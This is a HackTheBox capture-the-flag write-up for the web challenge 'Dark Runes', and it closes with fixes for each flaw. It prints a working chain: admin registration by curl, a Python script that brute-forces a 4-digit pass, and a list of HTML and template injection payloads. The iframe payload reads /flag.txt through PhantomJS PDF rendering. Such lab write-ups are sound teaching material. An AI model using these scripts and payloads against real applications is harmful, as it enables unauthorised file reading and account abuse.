---
title: Dark Runes
tags:
  - HackTheBox
  - Web
  - LFI
  - Brute Force
  - PDF Injection
categories:
  - HackTheBox
position: right
cover: '/img/dark-runes-cover.png'
description: 'HTB Web challenge — Admin registration, 4-digit brute force, and Local File Inclusion via PhantomJS PDF rendering'
date: 2026-06-20 20:00:00
---

> **Difficulty**: <span style="color:#9fef00">Easy</span> &nbsp;|&nbsp; **Category**: <span style="color:#9fef00">Web</span>

## Overview

A Node.js web application that lets users create documents and export them as PDFs, guarded by an admin-only debug endpoint. The goal is to read `/flag.txt` from the server by chaining three vulnerabilities together.

<!-- more -->

---

## Initial Code Analysis

After downloading the challenge source, the following key files stood out:

### Key Files

**`package.json`** — Revealed critical dependencies:

- `express` — Web framework
- `better-sqlite3` — Database
- `markdown-pdf@11.0.0` — PDF generation **(vulnerable)**
- `node-html-markdown` — HTML to markdown conversion
- `sanitize-html` — HTML sanitization

**`crypto.js`** — Cookie generation logic:

```javascript
const generateCookie = (username, id) => {
  const stringifiedUser = btoa(JSON.stringify({ username, id }));
  const sig = signString(stringifiedUser);
  return `${stringifiedUser}-${sig}`;
};
```

**`middlewares.js`** — Admin check:

```javascript
const isAdmin = (req, res, next) => {
  if (req.user.username === "admin") {
    return next();
  }
  return res.status(403).send("Forbidden");
};
```

**`pass.js`** — Access pass management:

```javascript
const rotatePass = () => {
    ACCESS_PASS = generateAccessCode(); // 4-digit number as string
    fs.writeFileSync(String(ACCESS_PASS), `You Access Code is "${generateRandomString(4)}"...`);
};

const verifyPass = (pass) => {
    if (!fs.existsSync(ACCESS_PASS)) return false;
    const currName = fs.readFileSync(ACCESS_PASS, { encoding: "utf-8" });
    return ACCESS_PASS === pass; // Compares with FILENAME, not content!
};
```

**`generate.js`** — Debug endpoint:

```javascript
router.post("/document/debug/export", isAuthenticated, isAdmin, async (req, res) => {
  const { access_pass, content } = req.body;
  if (!verifyPass(access_pass)) {
    rotatePass();
    return res.status(403).send("BAD PASS");
  }
  const generatedPDF = await generatePDF(content);
  return res.send(generatedPDF);
});
```

**`exporter.js`** — PDF generation:

```javascript
const generatePDF = async (content) => {
  return new Promise((resolve, reject) => {
    markdownpdf({ remarkable: { html: true } })
      .from.string(content)
      .to.buffer(undefined, (err, buffer) => {
        if (err != null) return reject(err);
        return resolve(buffer);
      });
  });
};
```

---

## Vulnerabilities Identified

### 1. Weak Access Pass (4-digit brute force)

The `generateAccessCode()` function creates a 4-digit code (0000–9999), only **10,000 possibilities**. This is trivially brute-forceable.

### 2. Local File Inclusion via PDF Generation

The `markdown-pdf` library with `{ remarkable: { html: true } }` allows raw HTML injection. The underlying **PhantomJS** renderer follows `<iframe src>` attributes, enabling reading of local files directly from the filesystem.

### 3. Admin Registration Possible

No restrictions prevented registering as `admin` if the account didn't already exist in the database.

---

## Exploitation Steps

### Step 1: Register as Admin

The admin account didn't exist initially, so registration was possible:

```bash
curl -X POST http://target:port/register \
  -d "username=admin&password=1112"
```

Login to obtain the cookie:

```bash
curl -X POST http://target:port/login \
  -d "username=admin&password=1112" \
  -c cookies.txt
```

**Cookie obtained:**

```
eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-19dca7e4ba74ad6c867044992c6c9ea99b609cf5a629619ba15a19b6cb57cb37
```

---

### Step 2: Brute Force the Access Pass

The debug endpoint requires a 4-digit access pass. Script to brute force:

```python
import requests

target = "http://<target>:<port>"
cookie = "eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-19dca7e4ba74ad6c867044992c6c9ea99b609cf5a629619ba15a19b6cb57cb37"

session = requests.Session()
session.cookies.set("user", cookie)

print("Brute forcing 4-digit access code...")

for code in range(10000):
    pass_code = f"{code:04d}"
    data = {"access_pass": pass_code, "content": "test"}
    r = session.post(f"{target}/document/debug/export", data=data)

    if r.status_code == 200:
        print(f"\n✅ FOUND: {pass_code}")
        break

    if code % 1000 == 0:
        print(f"Tried {code} codes...")
```

**Result:** Access pass `0130` was discovered.

---

### Step 3: Find Working Payload

The debug endpoint accepts any markdown/HTML content and generates a PDF. Multiple payloads were tested to read `/flag.txt`:

```python
import re

payloads = [
    "![](/flag.txt)",
    "<img src='/flag.txt'>",
    "<iframe src='/flag.txt'></iframe>",
    "<script>fetch('/flag.txt').then(r=>r.text()).then(d=>document.write(d))</script>",
    "{{ config }}",
    "${file.read('/flag.txt')}",
    "{% include '/flag.txt' %}"
]

for i, content in enumerate(payloads):
    data = {"access_pass": "0130", "content": content}
    r = session.post(f"{target}/document/debug/export", data=data)

    if b"HTB{" in r.content:
        match = re.search(b"HTB\\{[^}]+\\}", r.content)
        print(f"FLAG: {match.group().decode()}")
        break

    with open(f"output_{i}.pdf", "wb") as f:
        f.write(r.content)
```

**Working payload:** `<iframe src='/flag.txt'></iframe>` (payload index 2)

The generated PDF (`output_2.pdf`) contained the flag.

---

### Step 4: Extract the Flag

```bash
strings output_2.pdf | grep HTB
# or
pdftotext output_2.pdf - | grep HTB
```

**Flag obtained:** `HTB{...}`

---

## Why the Iframe Payload Worked

1. The `markdown-pdf` library uses **PhantomJS** (headless browser) to render HTML to PDF
2. PhantomJS processes iframes and makes HTTP requests to the specified URLs
3. `/flag.txt` was served by the same web server (since static files are served from the root)
4. The iframe fetched the file content, which was then rendered into the PDF

The JavaScript payloads failed because PhantomJS likely had JavaScript restrictions or the fetch API wasn't available. Image tags didn't work because they expected actual image data. The iframe successfully loaded the text file as an HTML document.

---

## How to Fix These Vulnerabilities

### 1. Strong Access Pass

```javascript
// Instead of 4-digit code:
const generateAccessCode = () => crypto.randomBytes(32).toString('hex');
// 64-character hex string = 2^256 possibilities
```

### 2. Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5 // 5 attempts max
});
app.use('/document/debug/export', limiter);
```

### 3. Disable Local File Access in PDF Generator

```javascript
// Use a safer PDF generator or configure PhantomJS to block file:// and local requests
const generatePDF = async (content) => {
  // Sanitize content to remove iframes, object tags, etc.
  const sanitized = sanitizeHtml(content, {
    allowedTags: ['p', 'strong', 'em', 'h1', 'h2', 'h3', 'ul', 'ol', 'li'],
    allowedAttributes: {}
  });
  // ... rest of PDF generation
};
```

### 4. Remove Debug Endpoint in Production

The `/document/debug/export` endpoint should never exist in production. Use environment variables to conditionally enable debug features.

### 5. Store Access Pass Securely

```javascript
// Don't use filename as the secret
const ACCESS_PASS = crypto.randomBytes(32);
// Store in memory or encrypted environment variable, not as a file
```

---

## Conclusion

This challenge combined multiple small vulnerabilities chained together:

1. **Weak 4-digit access pass** (brute force)
2. **Admin registration allowed** (no account protection)
3. **PDF generator with HTML injection** leading to local file inclusion

The fix requires strong authentication, removing debug endpoints, and properly sanitizing PDF generation input.

Have a nice day, and see you again in the next writeup!
Any feedback in the comments section is very appreciated.
